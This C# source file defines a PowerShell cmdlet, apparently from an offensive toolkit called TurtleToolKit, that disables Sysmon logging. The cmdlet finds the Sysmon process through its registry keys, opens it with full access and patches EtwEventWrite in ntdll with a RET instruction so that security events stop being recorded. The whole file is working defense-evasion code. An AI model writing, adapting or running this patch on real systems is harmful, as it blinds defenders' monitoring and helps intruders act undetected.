using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using TurtleToolKitManaged;

// Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
// Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}
// Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sysmon
namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Disable, "Sysmawn")]
    [Alias("dsmon")]
    public class DisableSysmon : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            if (!disableViaPatch())
            {
                // Add driver unload method?
                WriteWarning("Failed Or Not Found!");
                return;
            }
            WriteVerbose("Success");

        }
        protected override void EndProcessing()
        {
            base.EndProcessing();
            //WriteObject(success);
        }
        protected override void StopProcessing()
        {
            base.StopProcessing();
        }
        public bool disableViaPatch()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational");
            if (key == null)
            {
                WriteWarning("sysmon event reg key not found!");
                return false;
            }
            if (key.GetValue("OwningPublisher") == null)
            {
                WriteWarning("sysmon event publisher reg key not found!");
                return false;
            }
            WriteVerbose("Sysmon RegKey Found!");
            string sysmonPublisher = (string)key.GetValue("OwningPublisher");
            string path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\" + sysmonPublisher;
            RegistryKey publisherKey = Registry.LocalMachine.OpenSubKey(path);
            string sysmonExePath = (string)publisherKey.GetValue("ResourceFileName");
            string[] sysmonExeArray = sysmonExePath.Split('\\');
            string sysmonExe = sysmonExeArray.Last();
            // enum processes
            bool found = false;
            int sysmonPid = 0;
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (Path.GetFileName(p.MainModule.FileName) == sysmonExe)
                    {
                        WriteVerbose("Found Sysmon Process ID: " + p.Id);
                        sysmonPid = p.Id;
                        found = true;
                        break;
                    }
                }
                catch (Exception)
                { }
            }
            if (!found)
            {
                WriteWarning("Sysmon Process Not Found! Attempt driver method?");
                return false;
            }
            // Do Patch
            try
            {
                IntPtr hProcess = Win32.OpenProcess(0x001F0FFF, false, sysmonPid);
                if (hProcess == IntPtr.Zero)
                {
                    WriteWarning("Failed to open sysmon process");
                    return false;
                }
                // inserting ret instruction
                byte[] patch = new byte[2];
                patch[0] = 0xC3;
                patch[1] = 0x00;
                var lib = Win32.LoadLibrary("ntdll.dll");
                var addy = Win32.GetProcAddress(lib, "EtwEventWrite");
                IntPtr nWrote;
                Win32.VirtualProtectEx(hProcess,addy, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                if (!Win32.WriteProcessMemory(hProcess, addy, patch,patch.Length, out nWrote))
                {
                    WriteWarning("Failed to patch memory");
                    return false;
                }
                Win32.VirtualProtectEx(hProcess, addy, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
